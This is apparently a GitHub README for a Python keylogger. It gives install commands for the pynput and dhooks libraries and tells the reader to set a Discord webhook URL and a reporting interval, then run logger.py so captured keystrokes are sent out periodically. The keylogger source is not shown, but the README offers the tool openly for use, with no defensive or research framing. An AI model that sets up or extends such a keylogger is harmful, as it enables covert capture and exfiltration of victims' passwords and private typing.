# Keylogger
Keylogger written in Python via Discord Webhook

## ⚙️ 〢 Setup
```
pip install -r pynput
pip install -r dhooks
```

## 🤖 〢 Usage
Create a [Discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) \
Open the script and change this variables to you personal configuration.
```python
WEBHOOK_URL = 'your-custom-webhook-url'
TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds.
```
Once you saved your configuration, you can run the script.
```
python logger.py
```
